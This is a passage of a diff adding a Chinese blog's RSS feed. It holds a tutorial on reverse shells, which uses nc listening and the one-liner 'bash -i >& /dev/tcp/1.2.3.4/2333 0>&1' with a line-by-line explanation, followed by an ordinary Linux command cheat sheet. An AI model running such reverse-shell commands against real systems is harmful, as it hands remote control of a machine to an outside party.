+&lt;p&gt;nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。&lt;/p&gt;
+&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-l 使用监听模式&lt;/li&gt;
+&lt;li&gt;-vv verbose，使用两次会有更多信息&lt;/li&gt;
+&lt;li&gt;-p 本地端口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell&lt;/p&gt;
+&lt;p&gt;服务器端 B&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell&lt;/p&gt;
+&lt;p&gt;参考文章： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=&#34;&gt;https://www.jianshu.com/p/80d6b5a61372&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;命令详解：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;bash 命令行&lt;/li&gt;
+&lt;li&gt;-i 交互模式&lt;/li&gt;
+&lt;li&gt;&amp;gt;&amp;amp; 输出重定向，1 &amp;gt; 可以省略为 &amp;gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出&lt;/li&gt;
+&lt;li&gt;/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器&lt;/li&gt;
+&lt;li&gt;0&amp;gt;&amp;amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;由于 Linux 下一切皆文件，所以可以使用 &lt;code&gt;/dev/tcp&lt;/code&gt;  创建一个 socket 套接字，而 &lt;code&gt;/$&amp;#123;host&amp;#125;/$&amp;#123;port&amp;#125;&lt;/code&gt;  则是传入的参数。&lt;/p&gt;
+&lt;h1 id=&#34;反向shell工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反向shell工具&#34;&gt;#&lt;/a&gt; 反向 shell 工具&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv&#34;&gt;gsocket.io&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;可能的问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可能的问题&#34;&gt;#&lt;/a&gt; 可能的问题&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;shell 反弹失败&lt;/p&gt;
+&lt;p&gt;可能原因 1:&lt;/p&gt;
+&lt;p&gt;ubuntu 系统打开的终端默认为 &lt;code&gt;sh&lt;/code&gt; ，而 &lt;code&gt;sh&lt;/code&gt;  实际指向的是非交互式终端  &lt;code&gt;dash&lt;/code&gt; ，需要先切换到 &lt;code&gt;bash&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bach -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;-c 执行 command string&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/linux-commands/</guid>
+            <title>linux常用命令汇总</title>
+            <link>https://snowroll.github.io/linux-commands/</link>
+            <category>linux</category>
+            <category>shell</category>
+            <pubDate>Thu, 28 Jul 2022 02:35:04 +0000</pubDate>
+            <description><![CDATA[ &lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;强制命令模式执行： &lt;code&gt;:w !sudo tee %&lt;/code&gt; &lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight txt&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;w： 表示保存文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;！： 表示执行外部命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tee： linux命令，这个有点复杂，可以查看linux命令帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%： 在执行外部命令时，%会扩展成当前文件名；这个%区别于替换时的%，替换时%的意义是代表整个文件，而不是文件名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 只读文件，不修改强制退出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;上述方式非常完美的解决了不能保存只读文件的问题，但毕竟命令还是有些长，为了避免每次输入一长串的命令，可以将它映射为一个简单的命令加到 .vimrc 中：&lt;/p&gt;
+  &lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; Allow saving of files as sudo when I forgot to start vim using sudo.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; cmap w!! w !sudo tee &amp;gt; /dev/null %&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样，简单的运行:w!! 即可。命令后半部分 &amp;gt; /dev/null 作用为显式的丢掉标准输出的内容。&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;删除大量文件&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjQ3Mjkw&#34;&gt;Linux 下删除大量文件效率对比，看谁删的快！&lt;/span&gt;&lt;/p&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 首先建立空文件夹blanktest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ time rsync -a --delete blanktest/ &lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -a --delete blanktest/ &lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;/  0.59s user 7.86s system 51% cpu 16.418 total&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16s，很好很强大。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;查看磁盘可用空间&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;df -h  &lt;span class=&#34;comment&#34;&gt;# 查看磁盘可用空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;du -h --max-depth=1  ./  &lt;span class=&#34;comment&#34;&gt;# 查看当前目录及其目录的文件大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;du -sh ./  &lt;span class=&#34;comment&#34;&gt;# 查看当前目录总大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;apt-get 下载失败 &lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy8zNjMyMDAvZS11bmFibGUtdG8tY29ycmVjdC1wcm9ibGVtcy15b3UtaGF2ZS1oZWxkLWJyb2tlbi1wYWNrYWdlcw==&#34;&gt;E: Unable to correct problems, you have held broken packages&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 改用aptitude，更加方便智能&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install aptitude&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aptitude get install yourpkg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;查看进程&lt;/p&gt;
+  &lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 特定用户的特定进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -u root -ef | grep consume &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# kill特定用户的所有进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 1. 打印出所有pid，再kill&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -ef | grep ttlsa | awk &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123; print $2 &amp;#125;&amp;#x27;&lt;/span&gt; | sudo xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 2. -v --invert-match 显示不包含匹配文本的所有行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -ef | grep dynamic.sh | grep -v grep | awk &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27;&lt;/span&gt; | xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 3. pgrep -u参数查出用户的所有pid，然后依次kill&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pgrep -u ttlsa | sudo xargs &lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; -9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 查看进程 -e 显示系统内所有进程信息 -l long 长格式显示 -f full 完整显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps -elf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ps -aux 解释&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#   user     pid  cpu mem  vsz   rss  tty  stat start time command&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt; chaihua+ 26879 0.0 0.0 112820 968 pts/47 S+  15:49 0:00 grep --color=auto chaihuajun&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;列名&lt;/th&gt;
+&lt;th&gt;解释&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;USER&lt;/td&gt;
+&lt;td&gt;进程的拥有者用户名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PID&lt;/td&gt;
+&lt;td&gt;进程的 ID&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;%CPU&lt;/td&gt;
+&lt;td&gt;该进程使用 CPU 资源的百分比&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;%MEM&lt;/td&gt;
+&lt;td&gt;该进程使用内存资源的百分比&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;VSZ&lt;/td&gt;
+&lt;td&gt;进程使用的虚拟内存大小&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;RSS&lt;/td&gt;
+&lt;td&gt;进程使用的实际内存大小&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TTY&lt;/td&gt;
+&lt;td&gt;进程所绑定的终端&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;STAT&lt;/td&gt;
+&lt;td&gt;进程的状态&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;START&lt;/td&gt;
+&lt;td&gt;进程的启动时间&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TIME&lt;/td&gt;
+&lt;td&gt;该进程占用 CPU 时间的累计值&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;COMMAND&lt;/td&gt;
+&lt;td&gt;进程所对应的命令&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中， &lt;code&gt;-u&lt;/code&gt;  参数指定了只显示与当前用户相关的进程，而  &lt;code&gt;x&lt;/code&gt;  参数指定了显示所有进程，包括没有控制终端的进程。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看内存&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;更改文件夹权限及用户&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -R 递归 修改文件所有者&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chown [-R] username dirname/filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 修改文件所在群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chgrp [-R] groupname dirname/filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 查看用户组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/group&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 创建群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;groupadd groupName&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 将用户添加到指定组 -a append -G 将一个用户添加到多个群组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usermod -a -G groupA user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 修改访问权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ll 查看文件属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;drwxrw-r–&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;d 属性&lt;/li&gt;
+&lt;li&gt;rwx 所有者权限&lt;/li&gt;
+&lt;li&gt;rw- 群组用户权限&lt;/li&gt;
+&lt;li&gt;r-- 其他用户权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt;  用数字修改文件访问权限，绝对权限&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;权限&lt;/th&gt;
+&lt;th&gt;数字&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;r&lt;/td&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;w&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;x&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;code&gt;chmod&lt;/code&gt;  用字母分配权限，相对权限&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;字母&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;th&gt;符号&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;u&lt;/td&gt;
+&lt;td&gt;所有者&lt;/td&gt;
+&lt;td&gt;+&lt;/td&gt;
+&lt;td&gt;添加权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;g&lt;/td&gt;
+&lt;td&gt;群组用户&lt;/td&gt;
+&lt;td&gt;-&lt;/td&gt;
+&lt;td&gt;移除权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;o&lt;/td&gt;
+&lt;td&gt;其他用户&lt;/td&gt;
+&lt;td&gt;=&lt;/td&gt;
+&lt;td&gt;分配权限&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;a&lt;/td&gt;
+&lt;td&gt;所有用户&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;code&gt;chmod g+rx file&lt;/code&gt;   给群组用户添加可读、可执行权限&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ssh 配置公私钥&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9seHcxODQ0OTEyNTE0LzI5NDA3Mjc=&#34;&gt;参考链接：公私钥配置&lt;/span&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 生成公私钥对 -t 密钥类型 -c 注释文字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa -C &lt;span class=&#34;string&#34;&gt;&amp;#x27;chaihj15@163.com&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# .ssh下找到id_rsa.pub 上传到服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 追加到服务器ssh认证文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /xxx/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 如果没有authorized_keys，创建&amp;amp;赋予600权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 600 authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;本机创建～/.ssh/config&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Host            alias            #自定义别名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HostName        114.11.11.110         #替换为你的ssh服务器ip或domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Port            22             